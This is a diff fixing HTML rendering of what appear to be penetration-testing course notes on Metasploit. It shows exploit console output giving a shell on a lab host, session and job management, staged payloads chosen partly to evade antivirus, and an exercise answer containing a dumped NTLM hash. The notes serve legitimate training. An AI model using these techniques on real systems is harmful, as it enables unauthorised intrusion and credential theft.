@@ -1131,54 +1131,52 @@ uid=1(daemon) gid=1(daemon) groups=1(daemon)</p>
 Let&#39;s explore the concept of sessions and jobs in Metasploit.  Sessions are used to interact and manage access to successfully exploited targets, while jobs are used to run modules or features in the background.
 
 When we launched the exploit with `run`, a session was created and we obtained a shell.  We can background the session with `Ctrl+Z` and prompt confirmation.  Once sent to the background, we can use `sessions -l` to list all active sessions.
-</code></pre>
-<p>id
+```id
 uid=1(daemon) gid=1(daemon) groups=1(daemon)
 ^Z
 Background session 2? [y/N]  y
-msf6 exploit(multi/http/apache_normalize_path_rce) &gt; sessions -l</p>
-<h1>Active sessions</h1>
-<p>  Id  Name  Type             Information  Connection</p>
-<hr>
-<p>  2         shell x64/linux               192.168.45.182:4444 -&gt; 192.168.205.16:56688 (
-                                          192.168.205.16)</p>
-<pre><code>- Provides info about target and payload in use.
- - Making it easy to identify which session manages access to which target.
+msf6 exploit(multi/http/apache_normalize_path_rce) &gt; sessions -l
 
-Interact with a session again by passing the session ID to `sessions -i`.
+Active sessions
+===============
+
+  Id  Name  Type             Information  Connection
+  --  ----  ----             -----------  ----------
+  2         shell x64/linux               192.168.45.182:4444 -&gt; 192.168.205.16:56688 (
+                                          192.168.205.16)
 </code></pre>
-<p>msf6 exploit(multi/http/apache_normalize_path_rce) &gt; sessions -i 2
-[*] Starting interaction with 2...</p>
-<p>uname -a
-Linux 5def8107a7b2 5.4.0-132-generic #148-Ubuntu SMP Mon Oct 17 16:02:06 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</p>
-<pre><code>- We can enter commands into the interactive shell again.
-- Kill a session with `sessions -k` and the ID as arg.  .
+<ul>
+<li>Provides info about target and payload in use.</li>
+<li>Making it easy to identify which session manages access to which target.</li>
+</ul>
+<p>Interact with a session again by passing the session ID to <code>sessions -i</code>.</p>
+<pre><code>msf6 exploit(multi/http/apache_normalize_path_rce) &gt; sessions -i 2
+[*] Starting interaction with 2...
 
-Instead of launching an exploit and sending the resulting session to the background, we can use `run -j` to launch it in the context of a job.  We&#39;ll still get the output of the mod, but need to interact with the session before we can access it.
-
-In an assessment, we face many targets, making it easy to lose track of machines we already have access to.  Using a framework like MSF helps us manage access to these systems.  Eliminating the need to search through terminals for the correct session.  Launch exploit modules with `run -j` to launch exploit modules in the background, MDF will create the session for us, while we are already working on the next target.
-
-MSF also stores info about targets, mod results, and vulns in the DB.  Valuable for furhter steps in the pentest and reporting to the client.
-
-#### 20.2 Using Metasploit Payloads
-
-- Understand the differences between staged and non-staged payloads.
-- Explore the Meterpreter payload.
-- Create executable payloads.
-
-##### Staged vs Non-Staged Payloads
-
-Let&#39;s explore the difference between stages and non-staged payloads.  Assume we have identified a buffer overflow vuln in a server.  As we learned, we must be aware of the buffer size our shellcode will be stored in.  If the shellcode size exceeds buffer, our exploit will fail, making payload type vital.
-
-The diff is subtle but important.  A non-staged payload is sent complete with the exploit, the payload contains the exploit and full shellcode for task.  Generally, these all-in-one payloads are more stable, but the size is larger than other types.
-
-Staged payloads are sent in two parts.  The first is a small primary payload that has the victim connect back to the attacker, transfering a larget secondary payload with the rest of the shellcode, finally executing it.
-
-There are several situations in which we would prefer to use a staged payload instead of non-staged.  A staged payload may be a better choice when there are space limitations in an exploit, they are typically smaller.  AV can detect shellcode in an exploit, by utilizing a first stage, which loads second stage shellcode, retrieving the shellcode and injecting into memory detection may be prevented, increasing out chances of success.
-
-With our basic understanding of the two payload types, we will use the same exploit mod as in the prior section and enter `show payloads`, getting a list of all compatible payloads.
+uname -a
+Linux 5def8107a7b2 5.4.0-132-generic #148-Ubuntu SMP Mon Oct 17 16:02:06 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 </code></pre>
-<h1>msf6 exploit(multi/http/apache_normalize_path_rce) &gt; show payloads
+<ul>
+<li>We can enter commands into the interactive shell again.</li>
+<li>Kill a session with <code>sessions -k</code> and the ID as arg.  .</li>
+</ul>
+<p>Instead of launching an exploit and sending the resulting session to the background, we can use <code>run -j</code> to launch it in the context of a job.  We&#39;ll still get the output of the mod, but need to interact with the session before we can access it.</p>
+<p>In an assessment, we face many targets, making it easy to lose track of machines we already have access to.  Using a framework like MSF helps us manage access to these systems.  Eliminating the need to search through terminals for the correct session.  Launch exploit modules with <code>run -j</code> to launch exploit modules in the background, MDF will create the session for us, while we are already working on the next target.</p>
+<p>MSF also stores info about targets, mod results, and vulns in the DB.  Valuable for furhter steps in the pentest and reporting to the client.</p>
+<h4>20.2 Using Metasploit Payloads</h4>
+<ul>
+<li>Understand the differences between staged and non-staged payloads.</li>
+<li>Explore the Meterpreter payload.</li>
+<li>Create executable payloads.</li>
+</ul>
+<h5>Staged vs Non-Staged Payloads</h5>
+<p>Let&#39;s explore the difference between stages and non-staged payloads.  Assume we have identified a buffer overflow vuln in a server.  As we learned, we must be aware of the buffer size our shellcode will be stored in.  If the shellcode size exceeds buffer, our exploit will fail, making payload type vital.</p>
+<p>The diff is subtle but important.  A non-staged payload is sent complete with the exploit, the payload contains the exploit and full shellcode for task.  Generally, these all-in-one payloads are more stable, but the size is larger than other types.</p>
+<p>Staged payloads are sent in two parts.  The first is a small primary payload that has the victim connect back to the attacker, transfering a larget secondary payload with the rest of the shellcode, finally executing it.</p>
+<p>There are several situations in which we would prefer to use a staged payload instead of non-staged.  A staged payload may be a better choice when there are space limitations in an exploit, they are typically smaller.  AV can detect shellcode in an exploit, by utilizing a first stage, which loads second stage shellcode, retrieving the shellcode and injecting into memory detection may be prevented, increasing out chances of success.</p>
+<h1>With our basic understanding of the two payload types, we will use the same exploit mod as in the prior section and enter <code>show payloads</code>, getting a list of all compatible payloads.
+```
+msf6 exploit(multi/http/apache_normalize_path_rce) &gt; show payloads
 Compatible Payloads</h1>
 <h1>Name                                              Disclosure Date  Rank    Check  Description</h1>
 <hr>
@@ -2780,7 +2778,7 @@ offsec    ITWK01  1c3fb240ae45a2dc5951a043cf47040e  a914116eb78bec73deb381954642
 </ul>
 <h6>Exercises</h6>
 <p>Follow the steps from this section and use Kiwi to retrieve the NTLM hash of user offsec. Enter it as answer to this question.</p>
-<pre><code>1c3fb240ae45a2dc5951a043cf47040e
+<pre><code class="language-1c3fb240ae45a2dc5951a043cf47040e">
 </code></pre>
 <p>Search for a post-exploitation module that enumerates the Windows Hosts file and launch it against an active session on VM #1. What is the domain name of the only entry of this file?</p>
 <pre><code>msf6 exploit(multi/handler) &gt; search type:post host
